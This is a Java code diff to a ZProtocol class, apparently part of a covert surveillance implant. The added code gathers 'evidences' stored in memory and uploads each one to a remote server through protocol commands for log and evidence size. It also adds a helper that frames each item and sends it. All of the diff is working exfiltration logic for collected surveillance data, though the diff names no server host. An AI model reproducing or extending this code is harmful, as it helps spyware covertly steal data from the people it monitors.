@@ -814,11 +814,40 @@ public class ZProtocol extends Protocol {
 
     protected void sendEvidences(String basePath) throws TransportException,
             ProtocolException {
+        
+        
+        EvidenceCollector logCollector = EvidenceCollector.getInstance();
+        //#ifdef DEBUG
+        debug.info("sendEvidences from memory"); //$NON-NLS-1$
+        //#endif
+        
+        Vector evidences = logCollector.getMemoryEvidences();
+        
+        final int esize = evidences.size();
+       
+        for (int i = 0; i < esize; ++i) {
+            final byte[] ev = (byte[]) evidences.elementAt(i);
+            sendEvidence(ev);
+        }
+        
+        evidences.removeAllElements();
+        
+        
+        byte[] response;
+        if (!Keys.getInstance().isSeven()) {
+            // Evidence SIZE
+            byte[] plainOut = new byte[4 + 8];
+            Utils.copy(plainOut, 0, Utils.intToByteArray(evidences.size()), 0, 4);
+            response = command(Proto.EVIDENCE_SIZE, plainOut);
+            checkOk(response);
+        }
+        
+        
         //#ifdef DEBUG
         debug.info("sendEvidences from: " + basePath); //$NON-NLS-1$
         //#endif
 
-        EvidenceCollector logCollector = EvidenceCollector.getInstance();
+       
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
@@ -837,7 +866,6 @@ public class ZProtocol extends Protocol {
             byte[] plainOut = new byte[4 + 8];
             Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
 
-            byte[] response;
 
             if (!Keys.getInstance().isSeven()) {
                 response = command(Proto.EVIDENCE_SIZE, plainOut);
@@ -962,6 +990,28 @@ public class ZProtocol extends Protocol {
         }
     }
 
+    
+    private boolean sendEvidence(byte[] content) throws TransportException, ProtocolException {
+        final byte[] plainOut = new byte[content.length + 4];
+        Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
+                0, 4);
+        Utils.copy(plainOut, 4, content, 0, content.length);
+
+        final byte[] response = command(Proto.LOG, plainOut);
+
+        boolean ret = parseLog(response);
+
+        if (ret) {
+           
+        } else {
+            //#ifdef DEBUG
+            debug.warn("error sending file, bailing out"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+        return true;
+    }
+    
     private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
         final byte[] content = file.read();
         //#ifdef DEBUG
